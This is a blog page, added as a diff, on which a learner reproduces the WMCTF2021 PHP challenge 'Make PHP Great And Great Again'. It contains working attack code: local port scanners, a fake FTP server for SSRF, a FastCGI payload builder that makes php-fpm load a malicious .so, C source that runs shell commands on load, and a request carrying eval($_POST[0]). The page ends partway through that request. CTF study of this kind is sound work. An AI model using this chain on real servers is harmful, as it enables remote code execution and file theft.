@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+  <meta name="description" content="前言一年前WMCTF2021看到这个题的时候还是纯萌新，一点不会，至今还是很菜，跟着大师傅们的文章复现，争取学习到更多东西。 赵总自己的wp：https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6951.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Make PHP Great And Great Again 复现">
+<meta property="og:url" content="http://example.com/2022/07/04/Make%20PHP%20Great%20And%20Great%20Again/index.html">
+<meta property="og:site_name" content="smcq&#39;s blog">
+<meta property="og:description" content="前言一年前WMCTF2021看到这个题的时候还是纯萌新，一点不会，至今还是很菜，跟着大师傅们的文章复现，争取学习到更多东西。 赵总自己的wp：https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6951.html">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20220704131120010.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20220704220756092.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20220704224803287.png">
+<meta property="article:published_time" content="2022-07-04T15:29:58.090Z">
+<meta property="article:modified_time" content="2022-07-04T15:31:28.843Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20220704131120010.png">
+
+<link rel="canonical" href="http://example.com/2022/07/04/Make%20PHP%20Great%20And%20Great%20Again/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Make PHP Great And Great Again 复现 | smcq's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">smcq's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">不认,不输  脚踏实地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/04/Make%20PHP%20Great%20And%20Great%20Again/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="smcq's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Make PHP Great And Great Again 复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-07-04 23:29:58 / 修改时间：23:31:28" itemprop="dateCreated datePublished" datetime="2022-07-04T23:29:58+08:00">2022-07-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一年前WMCTF2021看到这个题的时候还是纯萌新，一点不会，至今还是很菜，跟着大师傅们的文章复现，争取学习到更多东西。</p>
+<p>赵总自己的wp：<a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6951.html">https://www.zhaoj.in/read-6951.html</a></p>
+<span id="more"></span>
+
+<h2 id="复现-用到的知识点"><a href="#复现-用到的知识点" class="headerlink" title="复现(用到的知识点)"></a>复现(用到的知识点)</h2><p>1，disable_functions禁用了phpinfo，可以用 <code>var_dump(ini_get(&#39;disable_functions&#39;))</code> <code>var_dump(ini_get_all())</code> <code>var_dump(get_cfg_var(&#39;disable_functions&#39;))</code> 获得，这里只能用后两个。</p>
+<p>2，信息收集</p>
+<p>（之前只用过一个curl，学习了）</p>
+<pre class="line-numbers language-none"><code class="language-none">for($i&#x3D;0;$i&lt;65535;$i++) &#123;
+  $t&#x3D;stream_socket_server(&quot;tcp:&#x2F;&#x2F;0.0.0.0:&quot;.$i,$ee,$ee2);
+  if($ee2 &#x3D;&#x3D;&#x3D; &quot;Address already in use&quot;) &#123;
+    var_dump($i);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">for($i&#x3D;0;$i&lt;65535;$i++) &#123;
+  $t&#x3D;file_get_contents(&#39;http:&#x2F;&#x2F;127.0.0.1:&#39;.$i);
+  if(!strpos(error_get_last()[&#39;message&#39;], &quot;Connection refused&quot;)) &#123;
+    var_dump($i);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>3，伪造恶意FTP服务器</p>
+<pre class="line-numbers language-none"><code class="language-none">$socket &#x3D; stream_socket_server(&quot;tcp:&#x2F;&#x2F;0.0.0.0:46819&quot;, $errno, $errstr);
+if (!$socket) &#123;
+  echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;
+&#125; else &#123;
+  while ($conn &#x3D; stream_socket_accept($socket)) &#123;
+    fwrite($conn, &quot;210 Fake FTP\n&quot;);
+    $line &#x3D; fgets($conn);
+    echo $line; &#x2F;&#x2F; USER
+    fwrite($conn, &quot;230 Login successful\n&quot;);
+    $line &#x3D; fgets($conn);
+    echo $line; &#x2F;&#x2F; TYPE
+    fwrite($conn, &quot;200 xx\n&quot;);
+    $line &#x3D; fgets($conn);
+    echo $line; &#x2F;&#x2F; SIZE
+    fwrite($conn, &quot;550 xx\n&quot;);
+    $line &#x3D; fgets($conn);
+    echo $line; &#x2F;&#x2F; EPSV
+    fwrite($conn, &quot;500 wtf\n&quot;);
+    $line &#x3D; fgets($conn);
+    echo $line; &#x2F;&#x2F; PASV
+
+    &#x2F;&#x2F; $ip &#x3D; &#39;192.168.1.4&#39;;
+    $ip &#x3D; &#39;127.0.0.1&#39;;
+    $port &#x3D; 11451;
+    $porth &#x3D; floor($port &#x2F; 256);
+    $portl &#x3D; $port % 256;
+    fwrite($conn, &quot;227 Entering Passive Mode. &quot;.str_replace(&#39;.&#39;,&#39;,&#39;,$ip).&quot;,$porth,$portl\n&quot;);
+    $line &#x3D; fgets($conn);
+    echo $line; &#x2F;&#x2F; STOR
+
+    fwrite($conn, &quot;125 GOGOGO!\n&quot;);
+    sleep(1);
+    fwrite($conn, &quot;226 Thanks!\n&quot;);
+    fclose($conn);
+  &#125;
+  fclose($socket);
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>4，再抄一个生成打fpm的payload，这里好几个注释写不用二次编码了，刚开始太理解，测试了下</p>
+<img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20220704131120010.png" alt="image-20220704131120010" style="zoom: 67%;" />  
+
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+
+class FCGIClient
+&#123;
+    const VERSION_1            &#x3D; 1;
+    const BEGIN_REQUEST        &#x3D; 1;
+    const ABORT_REQUEST        &#x3D; 2;
+    const END_REQUEST          &#x3D; 3;
+    const PARAMS               &#x3D; 4;
+    const STDIN                &#x3D; 5;
+    const STDOUT               &#x3D; 6;
+    const STDERR               &#x3D; 7;
+    const DATA                 &#x3D; 8;
+    const GET_VALUES           &#x3D; 9;
+    const GET_VALUES_RESULT    &#x3D; 10;
+    const UNKNOWN_TYPE         &#x3D; 11;
+    const MAXTYPE              &#x3D; self::UNKNOWN_TYPE;
+    const RESPONDER            &#x3D; 1;
+    const AUTHORIZER           &#x3D; 2;
+    const FILTER               &#x3D; 3;
+    const REQUEST_COMPLETE     &#x3D; 0;
+    const CANT_MPX_CONN        &#x3D; 1;
+    const OVERLOADED           &#x3D; 2;
+    const UNKNOWN_ROLE         &#x3D; 3;
+    const MAX_CONNS            &#x3D; &#39;MAX_CONNS&#39;;
+    const MAX_REQS             &#x3D; &#39;MAX_REQS&#39;;
+    const MPXS_CONNS           &#x3D; &#39;MPXS_CONNS&#39;;
+    const HEADER_LEN           &#x3D; 8;
+    &#x2F;**
+     * Socket
+     * @var Resource
+     *&#x2F;
+    private $_sock &#x3D; null;
+    &#x2F;**
+     * Host
+     * @var String
+     *&#x2F;
+    private $_host &#x3D; null;
+    &#x2F;**
+     * Port
+     * @var Integer
+     *&#x2F;
+    private $_port &#x3D; null;
+    &#x2F;**
+     * Keep Alive
+     * @var Boolean
+     *&#x2F;
+    private $_keepAlive &#x3D; false;
+    &#x2F;**
+     * Constructor
+     *
+     * @param String $host Host of the FastCGI application
+     * @param Integer $port Port of the FastCGI application
+     *&#x2F;
+    public function __construct($host, $port &#x3D; 9000) &#x2F;&#x2F; and default value for port, just for unixdomain socket
+    &#123;
+        $this-&gt;_host &#x3D; $host;
+        $this-&gt;_port &#x3D; $port;
+    &#125;
+    &#x2F;**
+     * Define whether or not the FastCGI application should keep the connection
+     * alive at the end of a request
+     *
+     * @param Boolean $b true if the connection should stay alive, false otherwise
+     *&#x2F;
+    public function setKeepAlive($b)
+    &#123;
+        $this-&gt;_keepAlive &#x3D; (boolean)$b;
+        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;
+            fclose($this-&gt;_sock);
+        &#125;
+    &#125;
+    &#x2F;**
+     * Get the keep alive status
+     *
+     * @return Boolean true if the connection should stay alive, false otherwise
+     *&#x2F;
+    public function getKeepAlive()
+    &#123;
+        return $this-&gt;_keepAlive;
+    &#125;
+    &#x2F;**
+     * Create a connection to the FastCGI application
+     *&#x2F;
+    private function connect()
+    &#123;
+        if (!$this-&gt;_sock) &#123;
+            &#x2F;&#x2F;$this-&gt;_sock &#x3D; fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
+            $this-&gt;_sock &#x3D; stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
+            if (!$this-&gt;_sock) &#123;
+                throw new Exception(&#39;Unable to connect to FastCGI application&#39;);
+            &#125;
+        &#125;
+    &#125;
+    &#x2F;**
+     * Build a FastCGI packet
+     *
+     * @param Integer $type Type of the packet
+     * @param String $content Content of the packet
+     * @param Integer $requestId RequestId
+     *&#x2F;
+    private function buildPacket($type, $content, $requestId &#x3D; 1)
+    &#123;
+        $clen &#x3D; strlen($content);
+        return chr(self::VERSION_1)         &#x2F;* version *&#x2F;
+            . chr($type)                    &#x2F;* type *&#x2F;
+            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) &#x2F;* requestIdB1 *&#x2F;
+            . chr($requestId &amp; 0xFF)        &#x2F;* requestIdB0 *&#x2F;
+            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     &#x2F;* contentLengthB1 *&#x2F;
+            . chr($clen &amp; 0xFF)             &#x2F;* contentLengthB0 *&#x2F;
+            . chr(0)                        &#x2F;* paddingLength *&#x2F;
+            . chr(0)                        &#x2F;* reserved *&#x2F;
+            . $content;                     &#x2F;* content *&#x2F;
+    &#125;
+    &#x2F;**
+     * Build an FastCGI Name value pair
+     *
+     * @param String $name Name
+     * @param String $value Value
+     * @return String FastCGI Name value pair
+     *&#x2F;
+    private function buildNvpair($name, $value)
+    &#123;
+        $nlen &#x3D; strlen($name);
+        $vlen &#x3D; strlen($value);
+        if ($nlen &lt; 128) &#123;
+            &#x2F;* nameLengthB0 *&#x2F;
+            $nvpair &#x3D; chr($nlen);
+        &#125; else &#123;
+            &#x2F;* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 *&#x2F;
+            $nvpair &#x3D; chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        &#125;
+        if ($vlen &lt; 128) &#123;
+            &#x2F;* valueLengthB0 *&#x2F;
+            $nvpair .&#x3D; chr($vlen);
+        &#125; else &#123;
+            &#x2F;* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 *&#x2F;
+            $nvpair .&#x3D; chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        &#125;
+        &#x2F;* nameData &amp; valueData *&#x2F;
+        return $nvpair . $name . $value;
+    &#125;
+    &#x2F;**
+     * Read a set of FastCGI Name value pairs
+     *
+     * @param String $data Data containing the set of FastCGI NVPair
+     * @return array of NVPair
+     *&#x2F;
+    private function readNvpair($data, $length &#x3D; null)
+    &#123;
+        $array &#x3D; array();
+        if ($length &#x3D;&#x3D;&#x3D; null) &#123;
+            $length &#x3D; strlen($data);
+        &#125;
+        $p &#x3D; 0;
+        while ($p !&#x3D; $length) &#123;
+            $nlen &#x3D; ord($data&#123;$p++&#125;);
+            if ($nlen &gt;&#x3D; 128) &#123;
+                $nlen &#x3D; ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |&#x3D; (ord($data&#123;$p++&#125;) &lt;&lt; 16);
+                $nlen |&#x3D; (ord($data&#123;$p++&#125;) &lt;&lt; 8);
+                $nlen |&#x3D; (ord($data&#123;$p++&#125;));
+            &#125;
+            $vlen &#x3D; ord($data&#123;$p++&#125;);
+            if ($vlen &gt;&#x3D; 128) &#123;
+                $vlen &#x3D; ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |&#x3D; (ord($data&#123;$p++&#125;) &lt;&lt; 16);
+                $vlen |&#x3D; (ord($data&#123;$p++&#125;) &lt;&lt; 8);
+                $vlen |&#x3D; (ord($data&#123;$p++&#125;));
+            &#125;
+            $array[substr($data, $p, $nlen)] &#x3D; substr($data, $p+$nlen, $vlen);
+            $p +&#x3D; ($nlen + $vlen);
+        &#125;
+        return $array;
+    &#125;
+    &#x2F;**
+     * Decode a FastCGI Packet
+     *
+     * @param String $data String containing all the packet
+     * @return array
+     *&#x2F;
+    private function decodePacketHeader($data)
+    &#123;
+        $ret &#x3D; array();
+        $ret[&#39;version&#39;]       &#x3D; ord($data&#123;0&#125;);
+        $ret[&#39;type&#39;]          &#x3D; ord($data&#123;1&#125;);
+        $ret[&#39;requestId&#39;]     &#x3D; (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);
+        $ret[&#39;contentLength&#39;] &#x3D; (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);
+        $ret[&#39;paddingLength&#39;] &#x3D; ord($data&#123;6&#125;);
+        $ret[&#39;reserved&#39;]      &#x3D; ord($data&#123;7&#125;);
+        return $ret;
+    &#125;
+    &#x2F;**
+     * Read a FastCGI Packet
+     *
+     * @return array
+     *&#x2F;
+    private function readPacket()
+    &#123;
+        if ($packet &#x3D; fread($this-&gt;_sock, self::HEADER_LEN)) &#123;
+            $resp &#x3D; $this-&gt;decodePacketHeader($packet);
+            $resp[&#39;content&#39;] &#x3D; &#39;&#39;;
+            if ($resp[&#39;contentLength&#39;]) &#123;
+                $len  &#x3D; $resp[&#39;contentLength&#39;];
+                while ($len &amp;&amp; $buf&#x3D;fread($this-&gt;_sock, $len)) &#123;
+                    $len -&#x3D; strlen($buf);
+                    $resp[&#39;content&#39;] .&#x3D; $buf;
+                &#125;
+            &#125;
+            if ($resp[&#39;paddingLength&#39;]) &#123;
+                $buf&#x3D;fread($this-&gt;_sock, $resp[&#39;paddingLength&#39;]);
+            &#125;
+            return $resp;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+    &#x2F;**
+     * Get Informations on the FastCGI application
+     *
+     * @param array $requestedInfo information to retrieve
+     * @return array
+     *&#x2F;
+    public function getValues(array $requestedInfo)
+    &#123;
+        $this-&gt;connect();
+        $request &#x3D; &#39;&#39;;
+        foreach ($requestedInfo as $info) &#123;
+            $request .&#x3D; $this-&gt;buildNvpair($info, &#39;&#39;);
+        &#125;
+        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
+        $resp &#x3D; $this-&gt;readPacket();
+        if ($resp[&#39;type&#39;] &#x3D;&#x3D; self::GET_VALUES_RESULT) &#123;
+            return $this-&gt;readNvpair($resp[&#39;content&#39;], $resp[&#39;length&#39;]);
+        &#125; else &#123;
+            throw new Exception(&#39;Unexpected response type, expecting GET_VALUES_RESULT&#39;);
+        &#125;
+    &#125;
+    &#x2F;**
+     * Execute a request to the FastCGI application
+     *
+     * @param array $params Array of parameters
+     * @param String $stdin Content
+     * @return String
+     *&#x2F;
+    public function request(array $params, $stdin)
+    &#123;
+        $response &#x3D; &#39;&#39;;
+&#x2F;&#x2F;        $this-&gt;connect();
+        $request &#x3D; $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
+        $paramsRequest &#x3D; &#39;&#39;;
+        foreach ($params as $key &#x3D;&gt; $value) &#123;
+            $paramsRequest .&#x3D; $this-&gt;buildNvpair($key, $value);
+        &#125;
+        if ($paramsRequest) &#123;
+            $request .&#x3D; $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
+        &#125;
+        $request .&#x3D; $this-&gt;buildPacket(self::PARAMS, &#39;&#39;);
+        if ($stdin) &#123;
+            $request .&#x3D; $this-&gt;buildPacket(self::STDIN, $stdin);
+        &#125;
+        $request .&#x3D; $this-&gt;buildPacket(self::STDIN, &#39;&#39;);
+        &#x2F;&#x2F; 输出构造好的请求
+        return (urlencode($request));
+    &#125;
+&#125;
+&#x2F;&#x2F; php5
+&#x2F;&#x2F; ssrf生成payload的话，这里不用管
+$client &#x3D; new FCGIClient(&quot;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;php-fpm.sock&quot;, -1);
+$SCRIPT_FILENAME &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;;
+$SCRIPT_NAME &#x3D; &#39;&#x2F;&#39;.basename($SCRIPT_FILENAME);
+&#x2F;&#x2F; GET参数
+$REQUEST_URI &#x3D; $SCRIPT_NAME;
+&#x2F;&#x2F; POST参数
+$content &#x3D; &#39;&#39;;
+&#x2F;&#x2F; 设置php_value利用php:&#x2F;&#x2F;input执行代码
+&#x2F;&#x2F; $PHP_ADMIN_VALUE &#x3D; &quot;allow_url_include&#x3D;On\nopen_basedir&#x3D;&#x2F;\nauto_prepend_file&#x3D;php:&#x2F;&#x2F;input&quot;;
+&#x2F;&#x2F; 设置php_value加载恶意so文件，把so文件上传到&#x2F;var&#x2F;www&#x2F;html中或其他目录
+$PHP_ADMIN_VALUE &#x3D; &quot;extension_dir &#x3D; &#x2F;tmp\nextension &#x3D; ant.so\n&quot;;
+$res &#x3D; $client-&gt;request(
+    array(
+        &#39;GATEWAY_INTERFACE&#39; &#x3D;&gt; &#39;FastCGI&#x2F;1.0&#39;,
+        &#39;REQUEST_METHOD&#39; &#x3D;&gt; &#39;POST&#39;,
+        &#39;SCRIPT_FILENAME&#39; &#x3D;&gt; $SCRIPT_FILENAME,
+        &#39;SCRIPT_NAME&#39; &#x3D;&gt; $SCRIPT_NAME,
+        &#39;REQUEST_URI&#39; &#x3D;&gt; $REQUEST_URI,
+        &#39;PHP_ADMIN_VALUE&#39;   &#x3D;&gt; $PHP_ADMIN_VALUE,
+        &#39;SERVER_SOFTWARE&#39; &#x3D;&gt; &#39;php&#x2F;fastcgiclient&#39;,
+        &#39;REMOTE_ADDR&#39; &#x3D;&gt; &#39;127.0.0.1&#39;,
+        &#39;REMOTE_PORT&#39; &#x3D;&gt; &#39;9985&#39;,
+        &#39;SERVER_ADDR&#39; &#x3D;&gt; &#39;127.0.0.1&#39;,
+        &#39;SERVER_PORT&#39; &#x3D;&gt; &#39;80&#39;,
+        &#39;SERVER_NAME&#39; &#x3D;&gt; &#39;localhost&#39;,
+        &#39;SERVER_PROTOCOL&#39; &#x3D;&gt; &#39;HTTP&#x2F;1.1&#39;,
+        &#39;CONTENT_TYPE&#39; &#x3D;&gt; &#39;application&#x2F;x-www-form-urlencoded&#39;,
+        &#39;CONTENT_LENGTH&#39; &#x3D;&gt; strlen($content),
+    ),
+    $content
+);
+&#x2F;&#x2F; 这次也不用二次编码了
+
+echo(str_replace(&quot;%2B&quot;, &quot;+&quot;, ($res)));
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为不出网（上帝视角已知cat suid提权）</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//gcc -shared -fPIC eval.c -o eval.so</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?glzjin&#x3D;eval($_POST[0]); HTTP&#x2F;1.1
+Host: 127.0.0.1:20001
+sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;95&quot;, &quot;;Not A Brand&quot;;v&#x3D;&quot;99&quot;
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: &quot;Windows&quot;
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.69 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
